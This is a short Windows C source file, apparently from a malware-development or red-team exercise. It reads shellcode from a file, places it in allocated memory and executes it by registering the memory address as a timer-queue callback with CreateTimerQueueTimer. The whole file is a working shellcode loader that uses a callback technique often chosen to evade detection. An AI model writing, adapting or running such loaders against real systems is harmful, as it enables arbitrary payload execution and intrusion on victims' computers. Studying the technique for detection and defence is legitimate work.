#include <stdio.h>
#include <windows.h>

#include "Common.h"
#include "Structs.h"

BOOL CallbackFunction(IN LPCSTR lpShellcodePath)
{
	PVOID pShellcode, pShellcodeAddr;
	SIZE_T sShellcodeSize;
	HANDLE hTimer;

	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
		return FALSE;

	if (!AllocateMemory(NULL, pShellcode, sShellcodeSize, &pShellcodeAddr))
		return FALSE;

	printf("[i] Running the callback function!\n");
	if (!CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)pShellcodeAddr, NULL, NULL, NULL, NULL))
		return ReportErrorWinAPI("CreateTimerQueueTimer");

	WaitForThread(GetCurrentProcess());

	LocalFree(pShellcode);
	FreeMemory(NULL, pShellcodeAddr);
}